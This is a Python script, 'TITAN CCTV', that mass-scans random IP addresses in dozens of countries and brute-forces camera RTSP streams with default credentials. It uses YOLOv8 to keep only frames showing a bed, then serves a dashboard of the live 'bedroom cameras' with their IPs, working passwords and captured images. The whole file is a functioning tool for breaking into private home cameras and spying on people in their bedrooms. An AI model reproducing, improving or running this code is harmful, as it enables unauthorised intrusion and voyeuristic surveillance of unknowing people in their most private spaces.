#!/usr/bin/env python3
"""
TITAN CCTV — Find 100 Live Bedroom Cameras Worldwide + Stream Dashboard
Scans global IP ranges, probes RTSP, runs YOLOv8 to detect beds,
verifies liveness, and serves a real-time streaming dashboard.
"""

import base64
import hashlib
import json
import os
import random
import re
import socket
import subprocess
import sys
import threading
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

# ── Setup paths ─────────────────────────────────────────────
BASE_DIR = Path(__file__).resolve().parent
FRAME_DIR = BASE_DIR / "hunt_frames"
RESULTS_DIR = BASE_DIR / "results"
YOLO_MODEL = BASE_DIR.parent / "yolov8n.pt"
STREAM_HTML = BASE_DIR / "bed_stream.html"
RESULTS_FILE = RESULTS_DIR / "bed_cams_live.json"

for d in (FRAME_DIR, RESULTS_DIR):
    d.mkdir(parents=True, exist_ok=True)

sys.path.insert(0, str(BASE_DIR))
from cctv_config import (
    CREDENTIALS, GLOBAL_CIDRS, REGIONS, RTSP_PATHS,
    SCAN_PORTS, ROOM_CLASSIFICATION, YOLO_CLASSES,
    get_cidrs_for_countries,
)

# ════════════════════════════════════════════════════════════
#  GLOBALS
# ════════════════════════════════════════════════════════════

BED_CAMS = []           # verified bed cameras
BED_CAMS_LOCK = threading.Lock()
SCAN_STATS = {
    "ips_generated": 0,
    "ports_scanned": 0,
    "rtsp_probed": 0,
    "frames_captured": 0,
    "yolo_analyzed": 0,
    "beds_found": 0,
    "verified_live": 0,
    "start_time": None,
    "status": "idle",
    "countries_scanning": [],
}
TARGET_COUNT = 100

# ════════════════════════════════════════════════════════════
#  YOLO DETECTOR
# ════════════════════════════════════════════════════════════

_yolo = None
_yolo_lock = threading.Lock()

def load_yolo():
    global _yolo
    if _yolo is None:
        with _yolo_lock:
            if _yolo is None:
                from ultralytics import YOLO
                mp = str(YOLO_MODEL) if YOLO_MODEL.exists() else "yolov8n.pt"
                _yolo = YOLO(mp)
                print(f"  [YOLO] Loaded: {mp}")
    return _yolo

def detect_bed(image_path: str, conf: float = 0.30) -> dict:
    """Run YOLOv8 — returns detection result with bed focus."""
    model = load_yolo()
    if not os.path.isfile(image_path):
        return {"has_bed": False, "error": "file_not_found"}
    try:
        results = model(image_path, conf=conf, verbose=False)
        detections = []
        has_bed = False
        for r in results:
            for box in r.boxes:
                cls_id = int(box.cls[0])
                label = YOLO_CLASSES.get(cls_id, f"class_{cls_id}")
                confidence = float(box.conf[0])
                detections.append({
                    "label": label,
                    "confidence": round(confidence, 3),
                    "class_id": cls_id,
                })
                if cls_id == 59:  # bed class
                    has_bed = True
        return {
            "has_bed": has_bed,
            "detections": detections,
            "objects": list({d["label"] for d in detections}),
            "bed_confidence": max(
                (d["confidence"] for d in detections if d["class_id"] == 59),
                default=0.0
            ),
        }
    except Exception as e:
        return {"has_bed": False, "error": str(e)}


# ════════════════════════════════════════════════════════════
#  NETWORK SCANNING
# ════════════════════════════════════════════════════════════

def tcp_check(ip: str, port: int, timeout: float = 1.2) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (OSError, socket.timeout):
        return False

def scan_ip_ports(ip: str) -> list[int]:
    """Check common camera ports on an IP."""
    open_ports = []
    for p in [554, 8554, 80, 8080]:
        if tcp_check(ip, p):
            open_ports.append(p)
    return open_ports


def generate_random_ips(cidrs: list[str], count: int) -> list[str]:
    """Generate random IPs from CIDR ranges."""
    import ipaddress
    ips = set()
    nets = []
    for c in cidrs:
        try:
            nets.append(ipaddress.ip_network(c, strict=False))
        except ValueError:
            continue
    if not nets:
        return []
    weights = [n.num_addresses for n in nets]
    attempts = 0
    while len(ips) < count and attempts < count * 30:
        attempts += 1
        net = random.choices(nets, weights=weights, k=1)[0]
        offset = random.randint(1, max(1, net.num_addresses - 2))
        ip = str(net.network_address + offset)
        if not ip.endswith(".0") and not ip.endswith(".255"):
            ips.add(ip)
    return list(ips)


# ════════════════════════════════════════════════════════════
#  RTSP PROBE — grab frame from camera
# ════════════════════════════════════════════════════════════

def probe_rtsp(ip: str, timeout: int = 5) -> dict | None:
    """Try credential/path combos to grab a frame via ffmpeg."""
    creds_to_try = CREDENTIALS[:8]
    paths_to_try = RTSP_PATHS[:6]

    for user, passwd in creds_to_try:
        for rpath in paths_to_try:
            auth = f"{user}:{passwd}@" if passwd else f"{user}:@"
            rtsp_url = f"rtsp://{auth}{ip}:554{rpath}"
            frame_path = str(FRAME_DIR / f"bed_{ip.replace('.', '_')}.jpg")
            try:
                r = subprocess.run(
                    ["ffmpeg", "-rtsp_transport", "tcp",
                     "-i", rtsp_url,
                     "-vframes", "1", "-f", "image2", "-y", frame_path],
                    capture_output=True, timeout=timeout, text=True,
                )
                if (r.returncode == 0
                        and os.path.isfile(frame_path)
                        and os.path.getsize(frame_path) > 1000):
                    res = _extract_res(r.stderr)
                    return {
                        "ip": ip,
                        "user": user,
                        "password": passwd,
                        "rtsp_url": rtsp_url,
                        "rtsp_path": rpath,
                        "frame_file": frame_path,
                        "resolution": res,
                        "timestamp": datetime.now().isoformat(),
                    }
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            # cleanup failed frame
            if os.path.isfile(frame_path) and os.path.getsize(frame_path) <= 1000:
                try:
                    os.remove(frame_path)
                except OSError:
                    pass
    return None


def _extract_res(stderr: str) -> str:
    m = re.search(r"(\d{2,5})x(\d{2,5})", stderr)
    return f"{m.group(1)}x{m.group(2)}" if m else "unknown"


# ════════════════════════════════════════════════════════════
#  VERIFY CAMERA IS STILL LIVE
# ════════════════════════════════════════════════════════════

def verify_live(cam: dict, timeout: int = 5) -> bool:
    """Re-grab a frame to confirm camera is still streaming."""
    rtsp_url = cam["rtsp_url"]
    verify_path = str(FRAME_DIR / f"verify_{cam['ip'].replace('.', '_')}.jpg")
    try:
        r = subprocess.run(
            ["ffmpeg", "-rtsp_transport", "tcp",
             "-i", rtsp_url,
             "-vframes", "1", "-f", "image2", "-y", verify_path],
            capture_output=True, timeout=timeout, text=True,
        )
        if r.returncode == 0 and os.path.isfile(verify_path) and os.path.getsize(verify_path) > 1000:
            # Update frame with fresh one
            original = cam["frame_file"]
            os.replace(verify_path, original)
            cam["verified_at"] = datetime.now().isoformat()
            cam["verified"] = True
            return True
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    if os.path.isfile(verify_path):
        try:
            os.remove(verify_path)
        except OSError:
            pass
    return False


# ════════════════════════════════════════════════════════════
#  MAIN SCAN PIPELINE
# ════════════════════════════════════════════════════════════

def scan_country_batch(countries: list[str], ips_per_batch: int = 3000,
                       workers: int = 80) -> list[dict]:
    """Scan a batch of countries for bed cameras."""
    cidrs = get_cidrs_for_countries(countries)
    if not cidrs:
        return []

    SCAN_STATS["countries_scanning"] = countries
    label = ", ".join(countries[:3])
    print(f"\n  [BATCH] Scanning: {label} ({len(cidrs)} CIDRs)")

    # Generate IPs
    ips = generate_random_ips(cidrs, ips_per_batch)
    SCAN_STATS["ips_generated"] += len(ips)
    print(f"    Generated {len(ips)} IPs")

    found_beds = []

    # Phase 1: Port scan to find hosts with RTSP ports open
    print(f"    Phase 1: Port scanning ({workers} threads)...")
    reachable = []
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futs = {pool.submit(scan_ip_ports, ip): ip for ip in ips}
        for fut in as_completed(futs):
            SCAN_STATS["ports_scanned"] += 1
            if len(found_beds) + len(BED_CAMS) >= TARGET_COUNT:
                for f in futs:
                    f.cancel()
                break
            try:
                ports = fut.result()
                if ports:
                    reachable.append(futs[fut])
            except Exception:
                pass
    print(f"    → {len(reachable)} hosts with open ports")

    if not reachable:
        return []

    # Phase 2: RTSP probe
    print(f"    Phase 2: RTSP probing {len(reachable)} hosts...")
    streams = []
    with ThreadPoolExecutor(max_workers=min(workers, 40)) as pool:
        futs = {pool.submit(probe_rtsp, ip): ip for ip in reachable}
        for fut in as_completed(futs):
            SCAN_STATS["rtsp_probed"] += 1
            if len(found_beds) + len(BED_CAMS) >= TARGET_COUNT:
                for f in futs:
                    f.cancel()
                break
            try:
                hit = fut.result()
                if hit:
                    streams.append(hit)
                    SCAN_STATS["frames_captured"] += 1
            except Exception:
                pass
    print(f"    → {len(streams)} live RTSP streams")

    if not streams:
        return []

    # Phase 3: YOLO detection — filter for beds
    print(f"    Phase 3: YOLO analyzing {len(streams)} frames for beds...")
    load_yolo()  # preload

    for cam in streams:
        if len(found_beds) + len(BED_CAMS) >= TARGET_COUNT:
            break
        SCAN_STATS["yolo_analyzed"] += 1
        det = detect_bed(cam["frame_file"])
        cam["yolo"] = det

        if det.get("has_bed"):
            cam["room_type"] = "bedroom"
            cam["bed_confidence"] = det.get("bed_confidence", 0)
            cam["objects_detected"] = det.get("objects", [])

            # Encode frame as base64 for the dashboard
            try:
                with open(cam["frame_file"], "rb") as f:
                    cam["frame_b64"] = base64.b64encode(f.read()).decode()
            except Exception:
                cam["frame_b64"] = ""

            found_beds.append(cam)
            SCAN_STATS["beds_found"] = len(BED_CAMS) + len(found_beds)
            print(f"    🛏  BED #{len(BED_CAMS) + len(found_beds):>3}  "
                  f"{cam['ip']:>16}  conf={det['bed_confidence']:.2f}  "
                  f"res={cam['resolution']}  "
                  f"objects={det.get('objects', [])}")

    return found_beds


def run_worldwide_bed_scan():
    """Main orchestrator: scan all regions until 100 bed cameras found."""
    SCAN_STATS["start_time"] = datetime.now().isoformat()
    SCAN_STATS["status"] = "scanning"

    print(f"\n{'='*70}")
    print(f"  TITAN CCTV — WORLDWIDE BED CAMERA HUNT")
    print(f"  Target: {TARGET_COUNT} verified live bedroom cameras")
    print(f"  Started: {SCAN_STATS['start_time']}")
    print(f"{'='*70}\n")

    # Preload YOLO model
    print("[INIT] Loading YOLOv8 model...")
    load_yolo()

    # Scan order: prioritize regions with high camera density
    scan_order = [
        # High density — lots of unsecured cameras
        ["China"],
        ["Vietnam", "Thailand", "Indonesia"],
        ["India", "Pakistan", "Bangladesh"],
        ["Brazil", "Colombia", "Argentina"],
        ["Russia", "Ukraine"],
        ["Turkey", "Iran", "Iraq"],
        ["South Korea", "Taiwan", "Japan"],
        ["Philippines", "Malaysia", "Cambodia", "Myanmar"],
        ["Spain", "Italy", "France", "Germany"],
        ["South Africa", "Nigeria", "Kenya", "Egypt"],
        ["Mexico", "Peru", "Chile", "Ecuador", "Venezuela"],
        ["United Kingdom", "Poland", "Romania", "Netherlands"],
        ["Czech Republic", "Sweden", "Greece", "Portugal"],
        ["Saudi Arabia", "UAE", "Israel"],
        ["USA", "Canada"],
        ["Australia", "New Zealand"],
        ["Nepal", "Sri Lanka"],
        ["Morocco", "Ethiopia", "Tanzania", "Ghana"],
        ["Kazakhstan", "Uzbekistan"],
    ]

    round_num = 0
    while len(BED_CAMS) < TARGET_COUNT:
        round_num += 1
        print(f"\n{'─'*50}")
        print(f"  ROUND {round_num} — {len(BED_CAMS)}/{TARGET_COUNT} beds found")
        print(f"{'─'*50}")

        for batch_countries in scan_order:
            if len(BED_CAMS) >= TARGET_COUNT:
                break

            remaining = TARGET_COUNT - len(BED_CAMS)
            # Scale IP generation based on how many we still need
            ips_count = min(5000, max(2000, remaining * 100))

            beds = scan_country_batch(
                batch_countries,
                ips_per_batch=ips_count,
                workers=100,
            )

            if beds:
                with BED_CAMS_LOCK:
                    for cam in beds:
                        if len(BED_CAMS) < TARGET_COUNT:
                            BED_CAMS.append(cam)

                # Save intermediate results
                save_results()

            if len(BED_CAMS) >= TARGET_COUNT:
                break

        # After one full round, if still under target, loop with more IPs
        if len(BED_CAMS) < TARGET_COUNT:
            print(f"\n  [!] Round {round_num} complete. "
                  f"{len(BED_CAMS)}/{TARGET_COUNT} found. "
                  f"Starting next round with expanded search...")

    # ── Verification Phase ──────────────────────────────────
    print(f"\n{'='*70}")
    print(f"  VERIFICATION PHASE — Re-checking all {len(BED_CAMS)} cameras")
    print(f"{'='*70}\n")

    verified = []
    with ThreadPoolExecutor(max_workers=20) as pool:
        futs = {pool.submit(verify_live, cam): cam for cam in BED_CAMS}
        for fut in as_completed(futs):
            cam = futs[fut]
            try:
                is_live = fut.result()
                if is_live:
                    verified.append(cam)
                    SCAN_STATS["verified_live"] = len(verified)
                    print(f"  ✓ LIVE  {cam['ip']:>16}  bed_conf={cam['bed_confidence']:.2f}")
                else:
                    print(f"  ✗ DEAD  {cam['ip']:>16}")
            except Exception:
                print(f"  ✗ ERR   {cam['ip']:>16}")

    # Replace with verified only
    with BED_CAMS_LOCK:
        BED_CAMS.clear()
        BED_CAMS.extend(verified)

    SCAN_STATS["status"] = "complete"
    save_results()

    print(f"\n{'='*70}")
    print(f"  SCAN COMPLETE")
    print(f"{'='*70}")
    print(f"  Bed cameras found   : {len(BED_CAMS)}")
    print(f"  IPs generated       : {SCAN_STATS['ips_generated']:,}")
    print(f"  Ports scanned       : {SCAN_STATS['ports_scanned']:,}")
    print(f"  RTSP probed         : {SCAN_STATS['rtsp_probed']:,}")
    print(f"  Frames captured     : {SCAN_STATS['frames_captured']:,}")
    print(f"  YOLO analyzed       : {SCAN_STATS['yolo_analyzed']:,}")
    print(f"  Verified live       : {SCAN_STATS['verified_live']}")
    print(f"  Results saved       : {RESULTS_FILE}")
    print(f"{'='*70}\n")

    return BED_CAMS


def save_results():
    """Save current bed cameras to JSON."""
    data = {
        "scan_id": f"bed_hunt_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
        "timestamp": datetime.now().isoformat(),
        "target": "worldwide_beds",
        "total_found": len(BED_CAMS),
        "stats": SCAN_STATS.copy(),
        "cameras": [],
    }
    for cam in BED_CAMS:
        entry = {
            "ip": cam["ip"],
            "rtsp_url": cam["rtsp_url"],
            "user": cam["user"],
            "password": cam["password"],
            "resolution": cam.get("resolution", "unknown"),
            "bed_confidence": cam.get("bed_confidence", 0),
            "objects_detected": cam.get("objects_detected", []),
            "room_type": cam.get("room_type", "bedroom"),
            "verified": cam.get("verified", False),
            "verified_at": cam.get("verified_at", ""),
            "timestamp": cam.get("timestamp", ""),
            "frame_b64": cam.get("frame_b64", ""),
        }
        data["cameras"].append(entry)

    with open(RESULTS_FILE, "w") as f:
        json.dump(data, f, indent=2, default=str)


# ════════════════════════════════════════════════════════════
#  STREAMING DASHBOARD
# ════════════════════════════════════════════════════════════

def generate_stream_page():
    """Generate HTML streaming dashboard for all found bed cameras."""
    cams_json = json.dumps([
        {
            "ip": c["ip"],
            "rtsp_url": c["rtsp_url"],
            "user": c["user"],
            "password": c["password"],
            "resolution": c.get("resolution", "?"),
            "bed_confidence": c.get("bed_confidence", 0),
            "objects": c.get("objects_detected", []),
            "verified": c.get("verified", False),
            "frame_b64": c.get("frame_b64", ""),
        }
        for c in BED_CAMS
    ], default=str)

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TITAN CCTV — Bedroom Camera Streams ({len(BED_CAMS)} Live)</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{
    background: #0a0a0f;
    color: #e0e0e0;
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    min-height: 100vh;
}}
.header {{
    background: linear-gradient(135deg, #1a0030 0%, #0d001a 100%);
    border-bottom: 2px solid #6b21a8;
    padding: 20px 30px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    position: sticky;
    top: 0;
    z-index: 100;
}}
.header h1 {{
    font-size: 1.6em;
    background: linear-gradient(90deg, #a855f7, #ec4899);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}}
.stats-bar {{
    display: flex;
    gap: 24px;
    font-size: 0.9em;
}}
.stat {{ text-align: center; }}
.stat-val {{ font-size: 1.8em; font-weight: 700; color: #a855f7; }}
.stat-lbl {{ color: #888; font-size: 0.75em; text-transform: uppercase; }}
.controls {{
    background: #111118;
    padding: 12px 30px;
    display: flex;
    gap: 12px;
    align-items: center;
    border-bottom: 1px solid #222;
    flex-wrap: wrap;
}}
.controls input, .controls select {{
    background: #1a1a24;
    border: 1px solid #333;
    color: #e0e0e0;
    padding: 8px 12px;
    border-radius: 6px;
    font-size: 0.85em;
}}
.controls button {{
    background: linear-gradient(135deg, #7c3aed, #a855f7);
    color: white;
    border: none;
    padding: 8px 20px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    transition: all 0.2s;
}}
.controls button:hover {{ transform: translateY(-1px); box-shadow: 0 4px 15px rgba(168,85,247,0.4); }}
.controls button.danger {{ background: linear-gradient(135deg, #dc2626, #ef4444); }}
.grid {{
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
    gap: 16px;
    padding: 20px 30px;
}}
.cam-card {{
    background: #111118;
    border: 1px solid #222;
    border-radius: 10px;
    overflow: hidden;
    transition: all 0.3s;
    position: relative;
}}
.cam-card:hover {{
    border-color: #6b21a8;
    box-shadow: 0 4px 20px rgba(107,33,168,0.3);
    transform: translateY(-2px);
}}
.cam-frame {{
    position: relative;
    background: #000;
    aspect-ratio: 16/9;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}}
.cam-frame img {{
    width: 100%;
    height: 100%;
    object-fit: cover;
}}
.cam-frame .refresh-overlay {{
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.7);
    display: none;
    align-items: center;
    justify-content: center;
    color: #a855f7;
    font-size: 1.2em;
    cursor: pointer;
}}
.cam-frame:hover .refresh-overlay {{ display: flex; }}
.cam-badge {{
    position: absolute;
    top: 8px;
    right: 8px;
    background: rgba(34, 197, 94, 0.9);
    color: white;
    padding: 3px 10px;
    border-radius: 12px;
    font-size: 0.7em;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}}
.cam-badge.unverified {{ background: rgba(239, 68, 68, 0.9); }}
.cam-num {{
    position: absolute;
    top: 8px;
    left: 8px;
    background: rgba(107,33,168,0.9);
    color: white;
    padding: 3px 10px;
    border-radius: 12px;
    font-size: 0.75em;
    font-weight: 700;
}}
.cam-info {{
    padding: 12px 14px;
}}
.cam-ip {{
    font-family: 'JetBrains Mono', 'Fira Code', monospace;
    font-size: 0.95em;
    color: #a855f7;
    margin-bottom: 4px;
}}
.cam-meta {{
    display: flex;
    gap: 12px;
    flex-wrap: wrap;
    font-size: 0.78em;
    color: #888;
    margin-top: 6px;
}}
.cam-meta span {{ display: flex; align-items: center; gap: 4px; }}
.conf-bar {{
    height: 3px;
    background: #222;
    border-radius: 2px;
    margin-top: 8px;
    overflow: hidden;
}}
.conf-fill {{
    height: 100%;
    border-radius: 2px;
    transition: width 0.5s;
}}
.objects-list {{
    margin-top: 6px;
    display: flex;
    gap: 4px;
    flex-wrap: wrap;
}}
.obj-tag {{
    background: #1e1e2e;
    border: 1px solid #333;
    padding: 2px 8px;
    border-radius: 10px;
    font-size: 0.7em;
    color: #ccc;
}}
.obj-tag.bed {{ background: #3b0764; border-color: #6b21a8; color: #d8b4fe; }}
.stream-btn {{
    display: inline-block;
    margin-top: 8px;
    background: linear-gradient(135deg, #059669, #10b981);
    color: white;
    padding: 5px 14px;
    border-radius: 6px;
    font-size: 0.75em;
    cursor: pointer;
    border: none;
    font-weight: 600;
}}
.stream-btn:hover {{ filter: brightness(1.2); }}
.footer {{
    text-align: center;
    padding: 20px;
    color: #555;
    font-size: 0.8em;
    border-top: 1px solid #1a1a24;
}}
.no-cams {{
    text-align: center;
    padding: 80px 20px;
    color: #555;
    font-size: 1.2em;
}}
@keyframes pulse {{ 0%,100% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} }}
.live-dot {{
    width: 8px; height: 8px;
    background: #22c55e;
    border-radius: 50%;
    display: inline-block;
    animation: pulse 2s infinite;
    margin-right: 4px;
}}
.modal {{
    display: none;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.9);
    z-index: 999;
    align-items: center;
    justify-content: center;
    flex-direction: column;
}}
.modal.active {{ display: flex; }}
.modal img {{
    max-width: 90vw;
    max-height: 80vh;
    border-radius: 8px;
}}
.modal .close-btn {{
    position: absolute;
    top: 20px;
    right: 30px;
    background: none;
    border: none;
    color: white;
    font-size: 2em;
    cursor: pointer;
}}
.modal .cam-details {{
    margin-top: 16px;
    background: #111;
    padding: 16px 24px;
    border-radius: 8px;
    font-family: monospace;
    font-size: 0.85em;
    max-width: 600px;
}}
</style>
</head>
<body>

<div class="header">
    <h1>TITAN CCTV — Bedroom Streams</h1>
    <div class="stats-bar">
        <div class="stat">
            <div class="stat-val" id="total-count">{len(BED_CAMS)}</div>
            <div class="stat-lbl">Cameras</div>
        </div>
        <div class="stat">
            <div class="stat-val" id="verified-count">{sum(1 for c in BED_CAMS if c.get('verified'))}</div>
            <div class="stat-lbl">Verified Live</div>
        </div>
        <div class="stat">
            <div class="stat-val" id="avg-conf">
                {(sum(c.get('bed_confidence', 0) for c in BED_CAMS) / max(len(BED_CAMS), 1) * 100):.0f}%
            </div>
            <div class="stat-lbl">Avg Confidence</div>
        </div>
    </div>
</div>

<div class="controls">
    <input type="text" id="search" placeholder="Search by IP..." oninput="filterCams()">
    <select id="sort" onchange="sortCams()">
        <option value="confidence">Sort: Confidence</option>
        <option value="ip">Sort: IP</option>
        <option value="resolution">Sort: Resolution</option>
    </select>
    <button onclick="refreshAll()">Refresh All Frames</button>
    <button onclick="exportJSON()" class="danger">Export JSON</button>
</div>

<div class="grid" id="cam-grid"></div>

<div class="modal" id="modal">
    <button class="close-btn" onclick="closeModal()">&times;</button>
    <img id="modal-img" src="">
    <div class="cam-details" id="modal-details"></div>
</div>

<div class="footer">
    TITAN CCTV v2 — Worldwide Bedroom Camera Scanner | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
</div>

<script>
const CAMERAS = {cams_json};

function renderCams(cams) {{
    const grid = document.getElementById('cam-grid');
    if (!cams.length) {{
        grid.innerHTML = '<div class="no-cams">No cameras found yet. Scanning in progress...</div>';
        return;
    }}
    grid.innerHTML = cams.map((cam, i) => {{
        const confPct = (cam.bed_confidence * 100).toFixed(1);
        const confColor = cam.bed_confidence > 0.7 ? '#22c55e' :
                          cam.bed_confidence > 0.5 ? '#eab308' : '#ef4444';
        const objects = (cam.objects || []).map(o =>
            `<span class="obj-tag ${{o === 'bed' ? 'bed' : ''}}">${{o}}</span>`
        ).join('');
        const imgSrc = cam.frame_b64 ? `data:image/jpeg;base64,${{cam.frame_b64}}` : '';
        const badge = cam.verified ?
            '<div class="cam-badge"><span class="live-dot"></span>LIVE</div>' :
            '<div class="cam-badge unverified">UNVERIFIED</div>';

        return `
        <div class="cam-card" data-ip="${{cam.ip}}">
            <div class="cam-frame" onclick="openModal(${{i}})">
                ${{imgSrc ? `<img src="${{imgSrc}}" alt="Camera ${{i+1}}">` : '<div style="color:#444">No Frame</div>'}}
                <div class="refresh-overlay">Click to enlarge</div>
                <div class="cam-num">#${{i+1}}</div>
                ${{badge}}
            </div>
            <div class="cam-info">
                <div class="cam-ip">${{cam.ip}}</div>
                <div class="cam-meta">
                    <span>Res: ${{cam.resolution}}</span>
                    <span>Bed: ${{confPct}}%</span>
                    <span>Objects: ${{(cam.objects||[]).length}}</span>
                </div>
                <div class="conf-bar">
                    <div class="conf-fill" style="width:${{confPct}}%;background:${{confColor}}"></div>
                </div>
                <div class="objects-list">${{objects}}</div>
                <button class="stream-btn" onclick="copyRtsp(${{i}})">Copy RTSP URL</button>
            </div>
        </div>`;
    }}).join('');
}}

function filterCams() {{
    const q = document.getElementById('search').value.toLowerCase();
    const filtered = CAMERAS.filter(c => c.ip.includes(q));
    renderCams(filtered);
}}

function sortCams() {{
    const by = document.getElementById('sort').value;
    const sorted = [...CAMERAS];
    if (by === 'confidence') sorted.sort((a,b) => b.bed_confidence - a.bed_confidence);
    else if (by === 'ip') sorted.sort((a,b) => a.ip.localeCompare(b.ip));
    else if (by === 'resolution') sorted.sort((a,b) => (a.resolution||'').localeCompare(b.resolution||''));
    renderCams(sorted);
}}

function openModal(idx) {{
    const cam = CAMERAS[idx];
    const modal = document.getElementById('modal');
    const img = document.getElementById('modal-img');
    const details = document.getElementById('modal-details');
    img.src = cam.frame_b64 ? `data:image/jpeg;base64,${{cam.frame_b64}}` : '';
    details.innerHTML = `
        <div><b>IP:</b> ${{cam.ip}}</div>
        <div><b>RTSP:</b> ${{cam.rtsp_url}}</div>
        <div><b>Credentials:</b> ${{cam.user}}:${{cam.password}}</div>
        <div><b>Resolution:</b> ${{cam.resolution}}</div>
        <div><b>Bed Confidence:</b> ${{(cam.bed_confidence*100).toFixed(1)}}%</div>
        <div><b>Objects:</b> ${{(cam.objects||[]).join(', ')}}</div>
        <div><b>Verified:</b> ${{cam.verified ? 'YES' : 'NO'}}</div>
    `;
    modal.classList.add('active');
}}

function closeModal() {{
    document.getElementById('modal').classList.remove('active');
}}

function copyRtsp(idx) {{
    const url = CAMERAS[idx].rtsp_url;
    navigator.clipboard.writeText(url).then(() => {{
        const btns = document.querySelectorAll('.stream-btn');
        if (btns[idx]) {{
            btns[idx].textContent = 'Copied!';
            setTimeout(() => btns[idx].textContent = 'Copy RTSP URL', 2000);
        }}
    }});
}}

function exportJSON() {{
    const blob = new Blob([JSON.stringify(CAMERAS, null, 2)], {{type: 'application/json'}});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'bed_cameras_export.json';
    a.click();
}}

function refreshAll() {{
    // Auto-refresh is a future feature — for now show notification
    alert('To refresh frames, re-run the scan script. Frames are captured at scan time.');
}}

document.addEventListener('keydown', e => {{ if (e.key === 'Escape') closeModal(); }});

// Initial render
renderCams(CAMERAS);
</script>
</body>
</html>"""
    with open(STREAM_HTML, "w") as f:
        f.write(html)
    print(f"\n  [DASHBOARD] Streaming page saved: {STREAM_HTML}")
    return str(STREAM_HTML)


# ════════════════════════════════════════════════════════════
#  HTTP SERVER — serve the dashboard
# ════════════════════════════════════════════════════════════

def serve_dashboard(port: int = 7701):
    """Start HTTP server to serve the bed camera dashboard."""
    os.chdir(str(BASE_DIR))

    class Handler(SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/" or self.path == "/index.html":
                self.path = "/bed_stream.html"
            elif self.path.startswith("/frames/"):
                self.path = "/hunt_frames/" + self.path[8:]
            elif self.path == "/api/cameras":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                data = json.dumps([{
                    "ip": c["ip"],
                    "rtsp_url": c["rtsp_url"],
                    "resolution": c.get("resolution", "?"),
                    "bed_confidence": c.get("bed_confidence", 0),
                    "verified": c.get("verified", False),
                } for c in BED_CAMS], default=str)
                self.wfile.write(data.encode())
                return
            elif self.path == "/api/stats":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(json.dumps(SCAN_STATS, default=str).encode())
                return
            return super().do_GET()

        def log_message(self, fmt, *args):
            pass  # suppress logs

    server = HTTPServer(("0.0.0.0", port), Handler)
    print(f"\n  [SERVER] Dashboard running at http://localhost:{port}")
    print(f"  [SERVER] Open in browser to view live bed camera streams\n")
    server.serve_forever()


# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Find 100 bed cameras worldwide")
    p.add_argument("--target", type=int, default=100, help="Number of bed cameras to find")
    p.add_argument("--port", type=int, default=7701, help="Dashboard port")
    p.add_argument("--no-server", action="store_true", help="Don't start web server")
    args = p.parse_args()

    TARGET_COUNT = args.target

    # Start dashboard server in background
    if not args.no_server:
        # Generate initial empty page
        generate_stream_page()
        server_thread = threading.Thread(target=serve_dashboard, args=(args.port,), daemon=True)
        server_thread.start()

    # Run the scan
    try:
        bed_cams = run_worldwide_bed_scan()

        # Generate final dashboard with all cameras
        html_path = generate_stream_page()
        print(f"\n  Open http://localhost:{args.port} to view all {len(bed_cams)} bed camera streams")
        print(f"  HTML file: {html_path}")
        print(f"  JSON data: {RESULTS_FILE}")

        if not args.no_server:
            print(f"\n  Dashboard server running on port {args.port}. Press Ctrl+C to stop.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n  Server stopped.")
    except KeyboardInterrupt:
        print(f"\n\n  [!] Interrupted. Found {len(BED_CAMS)} bed cameras so far.")
        save_results()
        generate_stream_page()
        print(f"  Partial results saved to {RESULTS_FILE}")
        print(f"  Dashboard: {STREAM_HTML}")
